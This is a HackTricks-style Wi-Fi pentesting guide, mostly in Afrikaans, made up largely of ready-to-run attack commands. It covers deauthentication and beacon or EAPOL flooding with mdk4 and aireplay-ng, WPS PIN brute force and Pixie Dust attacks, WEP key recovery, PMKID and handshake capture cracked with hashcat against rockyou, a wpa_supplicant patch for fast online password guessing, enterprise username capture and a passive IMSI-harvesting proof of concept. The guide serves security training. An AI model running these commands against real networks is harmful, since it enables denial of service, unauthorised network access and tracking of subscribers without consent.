# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi basiese kommando's
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Gereedskap

### Hijacker & NexMon (Android se interne Wi‑Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Voer airgeddon met docker uit**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Van: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Dit kan Evil Twin, KARMA, en Known Beacons-aanvalle uitvoer en daarna 'n phishing-sjabloon gebruik om die werklike netwerkwagwoord te bekom of sosiale netwerk-credentials te vang.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

This tool automates **WPS/WEP/WPA-PSK** attacks. It will automatically:

- Stel die interface in monitor mode
- Skandeer moontlike netwerke - en laat jou die slagoffer(e) kies
- If WEP - Launch WEP attacks
- Indien WPA-PSK
- Indien WPS: Pixie dust attack en die bruteforce attack (wees versigtig — die brute-force attack kan baie lank neem). Let wel dat dit nie null PIN of database/generated PINs probeer nie.
- Probeer die PMKID van die AP capture om dit te kraak
- Probeer kliënte van die AP deauthenticate om 'n handshake te capture
- If PMKID or Handshake, probeer om te bruteforce met top5000 wagwoorde.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Ontkoppel almal (of 'n spesifieke ESSID/Client)
- Random fake APs -- Versteek netwerke, moontlike crash-scanners
- Overload AP -- Probeer om die AP te laat ophou werk (gewoonlik nie baie nuttig nie)
- WIDS -- Speel met die IDS
- TKIP, EAPOL -- Sommige spesifieke aanvalle om sommige APs te DoS
- **Cracking**
- Crack **WEP** (verskeie gereedskap en metodes)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Nuttig om captive portal creds te capture en/of LAN-aanvalle uit te voer
- **WPA-PSK** Evil Twin -- Nuttig vir netwerk-aanvalle as jy die wagwoord ken
- **WPA-MGT** -- Nuttig om maatskappy credentials te capture
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Nuttig om captive portal creds te capture en/of LAN-aanvalle uit te voer
- **+ WPA** -- Nuttig om WPA handshakes te capture

## Open / OWE networks quick notes

- **Passive capture** on open SSIDs still works with monitor mode and tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) performs a per-station key exchange (no PSK), so air frames are encrypted even on "open" SSIDs. Being WPA3-based, it also enforces **802.11w PMF**, which blocks spoofed deauth/disassoc frames.
- OWE **authentiseer nie** toetreders nie: enigiemand kan assosieer, so **verify client isolation** in plaas van om op bemarkingsbeloftes te vertrou. Sonder isolasie werk ARP spoofing of responder-style poisoning op die plaaslike L2 steeds.
- **Evil Twin** remains feasible on open/OWE SSIDs by presenting a stronger signal; PMF just removes the deauth shortcut. If victims accept a forged TLS cert, full HTTP(S) MitM is regained.
- Broadcast poisoning on open guest Wi-Fi easily yields creds/hashes (LLMNR/NBT-NS/mDNS). See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Beskrywing vanaf** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, a prevalent method in Wi-Fi hacking, involve forging "management" frames to **forcefully disconnect devices from a network**. These ongeënkripteerde pakkette mislei kliente om te dink hulle kom van die regmatige netwerk af, waardeur aanvallers WPA handshakes kan insamel vir cracking-doeleindes of om netwerkverbindings aanhoudend te ontwrig. Hierdie taktiek, skrikwekkend in sy eenvoud, word wyd gebruik en het beduidende implikasies vir netwerksekuriteit.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 beteken deauthentication
- 1 is die aantal deauths om te stuur (jy kan meerdere stuur as jy wil); 0 beteken stuur dit deurlopend
- -a 00:14:6C:7E:40:80 is die MAC address van die access point
- -c 00:0F:B5:34:30:30 is die MAC address van die kliënt om te deauthenticate; as dit weggelaat word, word broadcast deauthentication gestuur (werk nie altyd nie)
- ath0 is die interface name

### Disassociation Packets

**Disassociation packets**, soortgelyk aan deauthentication packets, is 'n tipe management frame wat in Wi-Fi networks gebruik word. Hierdie packets dien om die verbinding tussen 'n toestel (soos 'n laptop of smartphone) en 'n access point (AP) te verbreek. Die hoofverskil tussen disassociation en deauthentication lê in hulle gebruiksituasies. Terwyl 'n AP **deauthentication packets om rogue devices eksplisiet van die netwerk te verwyder, disassociation packets word tipies gestuur wanneer die AP 'n afsluiting ondergaan**, herbegin, of verhuis, wat dus die ontkoppeling van alle gekoppelde nodes vereis.

**Hierdie aanval kan uitgevoer word met mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Meer DOS-aanvalle deur mdk4**

**In** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Stuur beacon frames om fake APs by clients te wys. Dit kan soms network scanners en selfs drivers laat crash!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**AANVALMODUS a: Authentication Denial-Of-Service**

Om authentication frames na alle toeganklike Access Points (APs) binne bereik te stuur, kan hierdie APs oorlaai, veral wanneer baie kliënte betrokke is. Hierdie intense verkeer kan tot stelselinstabiliteit lei, wat veroorsaak dat sommige APs vasvries of selfs herbegin.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) kontroleer of 'n SSID behoorlik openbaar is en bevestig die AP se reikafstand. Hierdie tegniek, gekombineer met **bruteforcing hidden SSIDs** met of sonder 'n wordlist, help om verborge netwerke te identifiseer en toegang daartoe te verkry.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Die stuur van willekeurige of duplikaat pakkette na verskillende QoS queues kan Michael Countermeasures op **TKIP APs** ontlok, wat tot 'n een-minuut lange afskakeling van die AP lei. Hierdie metode is 'n doeltreffende **DoS** (Denial of Service) aanvalstaktiek.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Om 'n AP te oorstroom met **EAPOL Start frames** skep **fake sessions**, oorlaai die AP en blokkeer legitieme kliënte. Alternatiewelik dwing die inspuiting van **fake EAPOL Logoff messages** kliënte om te ontkoppel; albei metodes ontwrig netwerkdiens doeltreffend.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Aanvalle op IEEE 802.11s mesh-netwerke**

Verskeie aanvalle op skakelbestuur en routering in mesh-netwerke.

**ATTACK MODE w: WIDS-verwarring**

Kruis-koppeling van kliënte na verskeie WDS-node of vals rogue APs kan Intrusion Detection and Prevention Systems manipuleer, wat verwarring en potensiële misbruik van die stelsel skep.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

'n packet fuzzer met 'n verskeidenheid packet-bronne en 'n omvattende stel modifiers vir packet-manipulasie.

### **Airggedon**

_**Airgeddon**_ bied die meeste van die aanvalle wat in die vorige kommentaar voorgestel is:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) vereenvoudig die proses om toestelle aan 'n router te koppel, en verbeter die opstelspoed en gerief vir netwerke wat met **WPA** of **WPA2** Personal enkripteer is. Dit is nie effektief teen die maklik gekompromitteerde **WEP** sekuriteit nie. WPS gebruik 'n 8-syfer PIN, gevalideer in twee halfdele, wat dit vatbaar maak vir brute-force attacks weens die beperkte aantal kombinasies (ongeveer 11 000 moontlikhede).

### WPS Bruteforce

Daar is 2 hoofhulpmiddels om hierdie aksie uit te voer: Reaver en Bully.

- **Reaver** is ontwerp as 'n robuuste en praktiese aanval teen WPS, en is getoets teen 'n wye verskeidenheid access points en WPS-implementasies.
- **Bully** is 'n **nuwe implementering** van die WPS brute force attack, geskryf in C. Dit het verskeie voordele bo die oorspronklike reaver code: minder dependencies, verbeterde geheue- en CPU-prestasie, korrekte hantering van endianness, en 'n meer robuuste stel opsies.

Die aanval misbruik die **WPS PIN se kwesbaarheid**, veral die blootstelling van die eerste vier syfers en die laaste syfer se rol as 'n checksum, wat die brute-force attack vergemaklik. Verdedigings teen brute-force attacks, soos **blocking MAC addresses** van aggressiewe aanvallers, vereis egter **MAC address rotation** om die aanval voort te sit.

Sodra die WPS PIN verkry is met hulpmiddels soos Bully of Reaver, kan die aanvaller die **WPA/WPA2 PSK** aflei, wat **volgehoue netwerktoegang** verseker.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

This refined approach targets WPS PINs using known vulnerabilities:

1. **Pre-discovered PINs**: Gebruik 'n databasis van bekende PINs wat gekoppel is aan spesifieke vervaardigers wat geneig is om uniforme WPS PINs te gebruik. Hierdie databasis korreleer die eerste drie oktette van MAC-addresses met waarskynlike PINs vir daardie vervaardigers.
2. **PIN Generation Algorithms**: Maak gebruik van algoritmes soos ComputePIN en EasyBox, wat WPS PINs bereken gebaseer op die AP se MAC-address. Die Arcadyan algorithm vereis bykomend 'n device ID, wat 'n ekstra laag by die PIN-generasieproses voeg.

### WPS Pixie Dust attack

**Dominique Bongard** het 'n fout ontdek in sommige Access Points (APs) met betrekking tot die skep van geheime kodes, bekend as **nonces** (**E-S1** en **E-S2**). As hierdie nonces uitgewerk kan word, word dit maklik om die AP se WPS PIN te kraak. Die AP openbaar die PIN binne 'n spesiale kode (hash) om te bewys dat dit wettig is en nie 'n vals (rogue) AP is nie. Hierdie nonces is in wese die "sleutels" om die "kluis" wat die WPS PIN bevat oop te maak. Meer hieroor is te vinde [hier](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

In eenvoudige terme is die probleem dat sommige APs nie toevallig genoeg sleutels gebruik het om die PIN tydens die koppelingsproses te enkripteer nie. Dit maak die PIN vatbaar daarvoor om van buite die netwerk geraad te word (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
As jy nie die toestel na monitor mode wil skakel nie, of as `reaver` en `bully` probleme ondervind, kan jy [OneShot-C](https://github.com/nikita-yfh/OneShot-C) probeer. Hierdie tool kan 'n Pixie Dust attack uitvoer sonder om na monitor mode te hoef te skakel.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Sommige swak ontwerpte stelsels laat selfs toe dat ’n **Null PIN** (’n leë of nie‑bestaande PIN) toegang verleen, wat nogal ongewoon is. Die hulpmiddel **Reaver** kan vir hierdie kwesbaarheid toets, in teenstelling met **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Al die voorgestelde WPS attacks kan maklik uitgevoer word met _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 en 6 laat jou jou **pasgemaakte PIN** probeer (as jy een het)
- 7 en 8 voer die **Pixie Dust attack** uit
- 13 laat jou die **NULL PIN** toets
- 11 en 12 sal die PINs wat verband hou met die geselekteerde AP uit beskikbare databasisse herinsamel en moontlike PINs genereer met: ComputePIN, EasyBox en opsioneel Arcadyan (aanbeveel, waarom nie?)
- 9 en 10 sal **elke moontlike PIN** toets

## **WEP**

**Hoekom dit in duie stort**

- RC4 seed is just **IV (24 bits) + shared key**. Die IV is cleartext, klein (2^24), en herhaal vinnig, sodat ciphertexts met dieselfde IV die keystream hergebruik.
- XORing twee ciphertexts met dieselfde keystream leaks `PlaintextA ⊕ PlaintextB`; voorspelbare headers + RC4 KSA biases (**FMS**) laat jou sleutelbytes “stem”. **PTW** optimaliseer dit deur ARP traffic te gebruik om vereistes te verminder tot tienduisende pakkette in plaas van miljoene.
- Integriteit is slegs **CRC32** (linear/unkeyed), dus kan 'n aanvaller bits omdraai en CRC32 herbereken sonder die sleutel → packet forgery/replay/ARP injection terwyl hy op IVs wag.

Die praktiese breek is deterministies:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon bevat steeds 'n "All-in-One" WEP-workflow as jy 'n begeleide UI verkies.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018 het **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) 'n nuwe attack method, uniek omdat dit slegs **one single packet** benodig en nie vereis dat enige clients met die teiken AP verbind is nie — net interaksie tussen die attacker en die AP.

Baie moderne routers voeg 'n **optional field** by die **first EAPOL** frame tydens association, bekend as `Robust Security Network`. Dit sluit die `PMKID` in.

Soos die oorspronklike pos verduidelik, word die **PMKID** geskep met bekende data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Aangesien die "PMK Name" konstant is, ons die BSSID van die AP en die station ken, en die `PMK` identies is aan dié van 'n volledige 4-way handshake, kan **hashcat** hierdie inligting gebruik om die PSK te kraak en die passphrase te herkry!

Om hierdie inligting te **gather** en plaaslik die wagwoord te **bruteforce**, kan jy die volgende doen:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs captured** sal in die **console** gewys word en ook **saved** binne \_ **/tmp/attack.pcap**\_\
Skakel nou die capture om na **hashcat/john** formaat en crack dit:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Neem asseblief kennis dat die formaat van 'n korrekte hash uit **4 dele** bestaan, soos: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` As joune **slegs** **3 dele** bevat, dan is dit **ongeldig** (die PMKID capture was nie geldig nie).

Let wel dat `hcxdumptool` **ook capture handshakes** (iets soos dit sal verskyn: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Jy kan die **handshakes** **transformeer** na **hashcat**/**john** formaat deur `cap2hccapx` te gebruik.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Ek het opgemerk dat sommige handshakes wat met hierdie tool vasgelê is nie gekraak kon word nie, selfs al is die korrekte password bekend. Ek beveel aan om handshakes ook op die tradisionele manier te vang indien moontlik, of verskeie daarvan met hierdie tool vas te lê._

### Handshake vaslegging

'n aanval op **WPA/WPA2** networks kan uitgevoer word deur 'n **handshake** vas te lê en te probeer om die **password** **offline** te **crack**. Hierdie proses behels die monitering van die kommunikasie van 'n spesifieke netwerk en die **BSSID** op 'n bepaalde **channel**. Hier is 'n vereenvoudigde gids:

1. Identifiseer die **BSSID**, **channel**, en 'n **connected client** van die teiken-netwerk.
2. Gebruik `airodump-ng` om die netwerkverkeer op die gespesifiseerde channel en BSSID te monitor, met die doel om 'n handshake vas te lê. Die opdrag sal soos volg lyk:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Om die kans om 'n handshake te vang te verhoog, koppel die client kortliks van die network af om 'n re-authentication af te dwing. Dit kan gedoen word met die `aireplay-ng` command, wat deauthentication packets na die client stuur:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note that as the client deauthenticated it could try to connect to a different AP or, in other cases, to a different network._

Sodra in die `airodump-ng` sekere handshake-inligting verskyn, beteken dit dat die handshake vasgevang is en jy kan ophou luister:

![](<../../images/image (172) (1).png>)

Sodra die handshake vasgevang is, kan jy dit **crack** met `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Kontroleer of daar 'n handshake in die lêer is

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Indien hierdie hulpmiddel 'n onvoltooide handshake van 'n ESSID vind voordat die voltooide een gevind is, sal dit nie die geldige een opspoor nie._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Vinniger aanlyn PSK guessing via `wpa_supplicant` ctrl socket (no clients/PMKID)

Wanneer geen clients naby is en die AP PMKID weier, kan jy PSKs aanlyn deursoek sonder om supplicants te respawn:

- Patch `wpa_supplicant.c` om `dur = 0;` af te dwing in die auth failure backoff logic (rond `ssid->auth_failures`), wat die temporary-disable timer effektief uitskakel.
- Run 'n enkele daemon met 'n control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Bedryf dit via die control interface, hergebruik dieselfde scan en network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
’n Klein Python-lus wat socket-gebeure lees (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) kan ongeveer 100 raaiskote in ongeveer 5 minute toets sonder scan overhead. Dit is steeds lawaaierig en opspoorbaar, maar vermy per-poging prosesherstarts en backoff delays.

## **WPA Enterprise (MGT)**

In **enterprise WiFi-opstellings sal jy verskeie verifikasie-metodes teëkom**, elk wat verskillende sekuriteitsvlakke en bestuursfunksies bied. Wanneer jy gereedskap soos `airodump-ng` gebruik om netwerkverkeer te inspekteer, mag jy identifiseerders vir hierdie verifikasie-tipes opmerk. Sommige algemene metodes sluit in:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Hierdie metode ondersteun hardware tokens en eenmalige wagwoorde binne EAP-PEAP. Anders as MSCHAPv2, gebruik dit nie 'n peer challenge nie en stuur wagwoorde in onversleutelde teks na die toegangspunt, wat 'n risiko vir downgrade-aanvalle inhou.
2. **EAP-MD5 (Message Digest 5)**:
- Betrek die stuur van die MD5-hash van die wagwoord vanaf die kliënt. Dit word **nie aanbeveel** nie weens kwesbaarheid vir woordeboekaanvalle, gebrek aan bediener-verifikasie, en onmoontlikheid om sessiespesifieke WEP-sleutels te genereer.
3. **EAP-TLS (Transport Layer Security)**:
- Benut beide kliënt- en bediener-side sertifikate vir verifikasie en kan dinamies gebruikersgebaseerde en sessiegebaseerde WEP-sleutels genereer om kommunikasie te beveilig.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Verskaf wedersydse verifikasie deur 'n geïnkripteerde tonnel, tesame met 'n metode om dinamiese, per-gebruiker, per-sessie WEP-sleutels af te lei. Dit vereis slegs bediener-side sertifikate, terwyl kliënte geloofsbriewe gebruik.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Werk soortgelyk aan EAP deur 'n TLS-tonnel te skep vir beskermde kommunikasie. Dit laat die gebruik van swakker verifikasieprotokolle bo-op EAP toe weens die beskerming wat die tonnel bied.
- **PEAP-MSCHAPv2**: Gereeld na verwys as PEAP, kombineer dit die kwesbare MSCHAPv2 challenge/response-meganisme met 'n beskermende TLS-tonnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Soortgelyk aan EAP-TLS maar inisieer 'n TLS-tonnel voordat sertifikate uitgeruil word, wat 'n addisionele laag sekuriteit bied.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Gebruikersnaam vaslegging

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) dit lyk asof as jy EAP gebruik die **"Identity"** **messages** ondersteun moet word, en die **username** in **duidelike teks** in die **"Response Identity"** messages gestuur gaan word.

Selfs as een van die veiligste verifikasiemetodes gebruik word: **PEAP-EAP-TLS**, is dit moontlik om die gebruikersnaam wat in die EAP-protokol gestuur word te **capture**. Om dit te doen, **vang 'n outentiseringskommunikasie** (begin `airodump-ng` binne 'n kanaal en `wireshark` in dieselfde koppelvlak) en filter die pakkette met `eapol`.\
Binne die "**Response, Identity**" pakket sal die **username** van die kliënt verskyn.

![](<../../images/image (850).png>)

### Anonieme identiteite

Identity hiding word ondersteun deur sowel EAP-PEAP as EAP-TTLS. In die konteks van 'n WiFi-netwerk word 'n EAP-Identity versoek gewoonlik deur die toegangspunt (AP) geïnisieer tydens die assosiasieproses. Om die beskerming van gebruiker-anonimiteit te verseker, bevat die antwoord van die EAP-kliënt op die gebruiker se toestel slegs die noodsaaklike inligting wat die aanvanklike RADIUS-bediener benodig om die versoek te verwerk. Hierdie konsep word deur die volgende scenario's geïllustreer:

- EAP-Identity = anonymous
- In hierdie scenario gebruik alle gebruikers die pseudonieme "anonymous" as hul gebruikersidentifiseerder. Die aanvanklike RADIUS-bediener funksioneer as óf 'n EAP-PEAP óf EAP-TTLS bediener, verantwoordelik vir die bestuur van die bediener-side van die PEAP of TTLS-protokol. Die innerlike (beskermde) verifikasiemetode word dan óf lokaal hanteer óf gedelegeer na 'n afgeleë (huis) RADIUS-bediener.
- EAP-Identity = anonymous@realm_x
- In hierdie situasie verberg gebruikers van verskillende realms hul identiteite terwyl hulle hul onderskeie realms aandui. Dit stel die aanvanklike RADIUS-bediener in staat om die EAP-PEAP of EAP-TTLS versoeke te proxieer na RADIUS-bedieners in hul tuisrealms, wat as die PEAP of TTLS bediener optree. Die aanvanklike RADIUS-bediener funksioneer slegs as 'n RADIUS-relay node.
- Alternatiewelik kan die aanvanklike RADIUS-bediener funksioneer as die EAP-PEAP of EAP-TTLS bediener en óf die beskermde verifikasiemetode hanteer óf dit na 'n ander bediener stuur. Hierdie opsie fasiliteer die konfigurasie van uiteenlopende beleide vir verskeie realms.

In EAP-PEAP, sodra die TLS-tonnel tussen die PEAP-bediener en die PEAP-kliënt gevestig is, inisieer die PEAP-bediener 'n EAP-Identity versoek en stuur dit deur die TLS-tonnel. Die kliënt reageer op hierdie tweede EAP-Identity versoek deur 'n EAP-Identity response te stuur wat die gebruiker se ware identiteit deur die geïnkripteerde tonnel bevat. Hierdie benadering voorkom effektief dat iemand wat die 802.11-verkeer afluister die gebruiker se werklike identiteit kan sien.

EAP-TTLS volg 'n effens ander prosedure. Met EAP-TTLS outentiseer die kliënt tipies deur PAP of CHAP, beveilig deur die TLS-tonnel. In hierdie geval sluit die kliënt 'n User-Name attribute en óf 'n Password óf CHAP-Password attribute in die aanvanklike TLS-boodskap in wat na tonnel-opstelling gestuur word.

Ongeag die gekose protokol, kry die PEAP/TTLS-bediener kennis van die gebruiker se werklike identiteit nadat die TLS-tonnel gevestig is. Die werklike identiteit kan as user@realm of eenvoudig user voorgestel word. Indien die PEAP/TTLS-bediener ook verantwoordelik is vir die verifiëring van die gebruiker, besit dit nou die gebruiker se identiteit en gaan voort met die verifikasiemetode wat deur die TLS-tonnel beskerm word. Alternatiewelik kan die PEAP/TTLS-bediener 'n nuwe RADIUS-versoek aan die gebruiker se tuis RADIUS-bediener stuur. Hierdie nuwe RADIUS-versoek laat die PEAP of TTLS-protokollaag weg. In gevalle waar die beskermde verifikasiemetode EAP is, word die innerlike EAP-boodskappe aan die tuis RADIUS-bediener gestuur sonder die EAP-PEAP of EAP-TTLS omhulsel. Die User-Name attribute van die uitgaande RADIUS-boodskap bevat die gebruiker se werklike identiteit, wat die anonymous User-Name van die inkomende RADIUS-versoek vervang. Wanneer die beskermde verifikasiemetode PAP of CHAP is (slegs deur TTLS ondersteun), word die User-Name en ander verifikasie-attribuite wat uit die TLS-lading onttrek is in die uitgaande RADIUS-boodskap ingevul, en vervang die anonymous User-Name en TTLS EAP-Message attribuite in die inkomende RADIUS-versoek.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Klik om uit te vou</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Aantekeninge:
- Werk voor enige TLS‑tonnel as die implementering bare EAP‑SIM/AKA gebruik sonder beskermde identiteit/pseudonieme.
- Die blootgestelde waarde is ’n permanente identifiseerder wat aan die intekenaar se SIM gekoppel is; insameling maak langtermyn‑opsporing en daaropvolgende telecommisbruik moontlik.

Impak
- Privaatheid: volgehoue gebruiker-/toestel‑opsporing vanaf passiewe Wi‑Fi‑vasleggings in openbare plekke.
- Aanvanklike telecommisbruik: met die IMSI kan ’n aanvaller met SS7/Diameter‑toegang ligging navraag doen of probeer oproep/SMS‑onderskep en MFA‑diefstal uitvoer.

